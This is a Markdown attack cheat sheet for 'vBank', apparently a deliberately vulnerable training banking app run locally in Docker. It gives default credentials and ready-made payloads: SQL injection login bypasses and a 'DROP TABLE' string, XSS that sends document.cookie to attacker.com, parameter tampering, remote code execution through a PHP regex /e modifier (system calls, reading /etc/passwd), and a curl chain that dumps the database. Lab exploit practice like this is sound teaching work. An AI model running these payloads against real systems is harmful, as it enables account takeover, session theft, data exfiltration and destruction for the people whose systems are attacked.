# vBank Quick Reference - Attack Cheat Sheet

**📖 For detailed attack walkthroughs and analysis, see [PENETRATION_TESTING_GUIDE.md](PENETRATION_TESTING_GUIDE.md)**

This cheat sheet contains quick-reference payloads and commands.

---

## URLs & Credentials

### Application Access
| Item | Value |
|------|-------|
| Base URL | http://localhost/ |
| Login | http://localhost/login.php |
| Main Page | http://localhost/index.php?page=htbmain |
| phpMyAdmin | http://localhost:8081/ |

### Users
| Username | Password | User ID | Accounts |
|----------|----------|---------|----------|
| alex | 413Xp455 | 1 | 11111111, 33333333 |
| bob | b0BP4S5 | 2 | 22222222 |

### Database
```
Host: 127.0.0.1 (or 'mysql' in Docker)
Port: 3306
User: root
Password: aaa
Database: vbank
```

### phpMyAdmin
```
URL: http://localhost:8081/
User: root
Password: aaa
Server: mysql
```

---

## Account Numbers & XOR Key

### XOR Key
```
0x0BADC0DE = 3735928830
```

### Known Accounts
| Original | Xored | Owner | Balance |
|----------|-------|-------|---------|
| 11111111 | 252170513 | alex | 1000 |
| 22222222 | 243688756 | bob | 222 |
| 33333333 | 235207009 | alex | 344 |

### Quick Decode/Encode
```bash
python3 vbank_utils.py decode 252170513
python3 vbank_utils.py encode 11111111
python3 vbank_utils.py accounts
```

---

## SQL Injection Payloads

### Authentication Bypass (login.php)
```
Username: ' OR '1'='1
Password: ' OR '1'='1
OR
Username: admin' --
Password: anything
OR
Username: ' UNION SELECT 1,2,3,4,5,6,7,8--
Password: anything
```

### Extract Data via Transfer Remark
```
Remark: '; DROP TABLE accounts; --
Remark: ' UNION SELECT password,username,1,2,3,4,5,6 FROM users--
Remark: ' AND (SELECT COUNT(*) FROM users)--
```

### Time-Based Detection
```
Remark: ' AND SLEEP(5)--
Remark: ' OR 1=1 AND SLEEP(5)--
```

### cURL Example
```bash
curl -G "http://localhost/login.php" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=' OR '1'='1"
```

---

## XSS Payloads

### Basic Alert
```html
<img src=x onerror="alert('XSS')">
<script>alert('XSS')</script>
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

### Cookie Exfiltration
```html
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
<img src=x onerror="new Image().src='http://attacker.com/log?cookie='+document.cookie">
```

### Console.log Session Info
```html
<img src=x onerror="console.log(document.cookie)">
<img src=x onerror="console.log('Session: ' + document.cookie)">
```

### Stored XSS Location
- **htbdetails.page** - Remark field in transfer history
- **htbtransfer.page** - Remark field when creating transfer
- Any user viewing that account will execute the XSS

### Test Stored XSS
1. Log in as alex
2. Go to Transfer Funds
3. Fill form with:
   - Source: account dropdown (autofilled)
   - Destination: 22222222
   - Amount: 1
   - Remark: `<img src=x onerror="alert('XSS')">` 
4. Submit
5. Go to Account Details
6. XSS fires when viewing transfer history

---

## Parameter Tampering Payloads

### Negative Transfer Amount (Credit Own Account)
```
amount=-500
```
Transfers -500 from destination to source (reverse flow)

### Manipulate Loan Amount
```
Original request: loan=1000
Modified request: loan=999999
```

### Burp Suite Intercept
1. Forward login request
2. Go to Transfer page
3. **Intercept POST** to transfer handler
4. Modify parameters:
   - `amount` → `999999`
   - `dstacc` → different account
   - `remark` → SQL injection payload
5. Forward

---

## Client-Side Validation Bypass

### JavaScript Validation (htb.js)
The app checks password format in JavaScript:
- Only allows alphanumeric characters: `[a-zA-Z0-9]`

### Bypass Methods
1. **Disable JavaScript** in browser
2. **Use cURL** - ignores client-side validation
3. **Modify Request** with proxy/Burp Suite
4. **Direct POST** with special characters

### Example
```bash
# Server doesn't validate these special chars
curl -X POST "http://localhost/login.php" \
  --data "username=alex@#$%&password=test!@#$%"
```

---

## RCE via Regex /e Modifier

### Vulnerable Code
```php
$transfersStr = preg_replace('#(\>((?>(([^><]+|(?R))))*\<))#se',$replaceWith,'>'.$transfersStr.'<');
```

### Location
- **File**: pages/htbdetails.page
- **Parameter**: `query` (search query parameter)
- **Line**: 56-60

### Payload Examples
```
query=" . system('id') . "
query=" . system('whoami') . "
query=" . phpinfo() . "
query=" . file_get_contents('/etc/passwd') . "
```

### URL Example
```
http://localhost/index.php?page=htbdetails&account=<xored>&query=" . system('id') . "
```

### URL Encoded
```
http://localhost/index.php?page=htbdetails&account=252170513&query=%22%20.%20system%28%27id%27%29%20.%20%22
```

---

## Common Testing Workflows

### Quick SQL Injection Test
```bash
# 1. Test login bypass
curl -G "http://localhost/login.php" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=test" \
  -i | grep -i location

# 2. Decode session
python3 vbank_utils.py accounts

# 3. Perform authenticated attack
# ... use obtained session cookie
```

### XSS Testing Flow
```bash
# 1. Login
curl -c cookies.txt "http://localhost/login.php" \
  --data "username=alex&password=413Xp455"

# 2. Create transfer with XSS
curl -b cookies.txt "http://localhost/index.php" \
  --data "page=htbtransfer&..." \
  --data-urlencode "remark=<img src=x onerror='alert(1)'>"

# 3. View transfer to trigger XSS
curl -b cookies.txt "http://localhost/index.php?page=htbdetails&account=252170513"
```

---

## Database Tools & Access

### phpMyAdmin Web Interface
```
URL: http://localhost:8081/
User: root
Password: aaa
Server: mysql
```

**Use phpMyAdmin to**:
- Browse database tables visually
- Execute SQL queries directly
- View user passwords in plain text
- View all account balances
- Verify SQL injection results
- Modify data directly

### Quick Queries in phpMyAdmin

**View All Users & Passwords**:
```sql
SELECT id, username, password, name FROM users;
```

**View All Accounts & Balances**:
```sql
SELECT account, owner, curbal, deposit FROM accounts;
```

**View All Transfers**:
```sql
SELECT * FROM transfers ORDER BY time DESC;
```

**View All Loans**:
```sql
SELECT * FROM loans;
```

### MySQL Command Line Access
```bash
# From host
mysql -h 127.0.0.1 -u root -paaa vbank

# From Docker
docker exec -it vbank_mysql mysql -u root -paaa vbank
```

---

## Database Dump Exploits

### One-Line Automatic Dump (30 seconds)
```bash
./db_dump.sh http://localhost ./dumps
# Output: ./dumps/vbank_dump_YYYYMMDD_HHMMSS.sql
```

### Python Automated Dump
```bash
# RCE method (fastest)
python3 db_dump_exploit.py --method 1 --format sql

# Direct MySQL method (best for JSON)
python3 db_dump_exploit.py --method 3 --format json
```

### Manual Dump (Educational)
```bash
# Step 1: Authenticate
curl -c cookies.txt -G "http://localhost/index.php" \
  --data-urlencode "page=login" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=x"

# Step 2: Trigger RCE
curl -b cookies.txt -G "http://localhost/index.php" \
  --data-urlencode "page=htbdetails" \
  --data-urlencode "account=252170513" \
  --data-urlencode "query=\" . system('mysqldump -u root -paaa vbank > /var/www/html/vbank_dump.sql') . \""

# Step 3: Download
sleep 2
curl "http://localhost/vbank_dump.sql" -o vbank_dump.sql
```

### Verify Dump
```bash
head -30 vbank_dump.sql                        # Schema
grep "INSERT INTO" vbank_dump.sql | wc -l     # Count records
grep "INSERT INTO users" vbank_dump.sql        # Show credentials
```

### Direct MySQL Dump (if port 3306 exposed)
```bash
mysqldump -h 127.0.0.1 -u root -paaa vbank > vbank_dump.sql
```

### Restore Dumped Database
```bash
# Import to new instance
mysql -u root -pYourPassword < vbank_dump.sql

# Import to specific host
mysql -h database.example.com -u root -p < vbank_dump.sql
```

---

## Docker Commands

```bash
# Start
docker-compose up -d

# Stop
docker-compose down

# View logs
docker-compose logs -f php
docker-compose logs -f mysql
docker-compose logs -f phpmyadmin

# Access containers
docker exec -it vbank_app bash
docker exec -it vbank_mysql mysql -u root -paaa vbank

# Restart
docker-compose restart

# Access phpMyAdmin
# Open: http://localhost:8081/
```

---

## Vulnerable Files Reference

| File | Vulnerability | Lines |
|------|---|---|
| login.php | SQL Injection | 16-18 |
| htbtransfer.page | SQL Injection | 39 |
| htbdetails.page | RCE (/e modifier) | 56-60 |
| htbdetails.page | Stored XSS | 45 |
| htbloanconf.page | Parameter Tampering | 24 |
| htb.js | Client-Side Validation | 1-18 |
| htb.inc | Path Traversal (LFI) | htb_load_page() |

---

## Detection & Logging

### Check for SQL Injection Attempts
```sql
-- MySQL - look for suspicious characters in queries
SELECT * FROM transfers WHERE remark LIKE '%''%' OR remark LIKE '%-- %' OR remark LIKE '%UNION%';
```

### Check Apache Logs
```bash
docker exec vbank_app tail -f /var/log/apache2/error.log
docker exec vbank_app tail -f /var/log/apache2/access.log
```

### Check for XSS Payloads
```bash
docker exec vbank_app grep -r "<img" /var/www/
docker exec vbank_app grep -r "<script" /var/www/
```

---

## Quick Python One-Liners

### XOR Account Numbers
```python
python3 -c "print(11111111 ^ 0x0BADC0DE)"                    # Encode
python3 -c "print(252170513 ^ 0x0BADC0DE)"                   # Decode
python3 -c "print('Account:', 252170513 ^ 0x0BADC0DE)"       # Both
```

### Generate SQL Payload
```python
python3 -c "print(\"' OR '1'='1\" + \"-- \")"
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' OR '1'='1\"))"
```

### Generate XSS Payload
```python
python3 -c "print('<img src=x onerror=\"alert(document.cookie)\">')"
```

---

## Tools Needed

- **curl** - Command-line HTTP requests
- **Python 3** - For exploit scripts
- **Burp Suite Community** - HTTP proxy & intercept
- **MySQL Client** - Direct database access
- **Firefox/Chrome** - Browser testing
- **Text Editor** - Code review

---

## OWASP Reference

- **A03:2021 – Injection** (SQL Injection, Command Injection)
- **A04:2021 – Insecure Design** (Parameter Tampering, Missing Controls)
- **A05:2021 – Security Misconfiguration** (Plain Text Passwords)
- **A07:2021 – Identification and Authentication Failures** (Weak Auth)
- **A03:2021 – Cross-Site Scripting (XSS)** (Output Encoding)

---

## Further Learning

- Read **attacks.md** for detailed vulnerability analysis
- Review vulnerable source code: see "Vulnerable Files Reference"
- Use **test_exploits.py** for automated testing
- Check **README.md** for complete setup and testing guide
- Review **vbank_utils.py** for payload generation

---

**Remember**: Authorized testing only. This is for learning purposes.
**Last Updated**: 2026-06-04
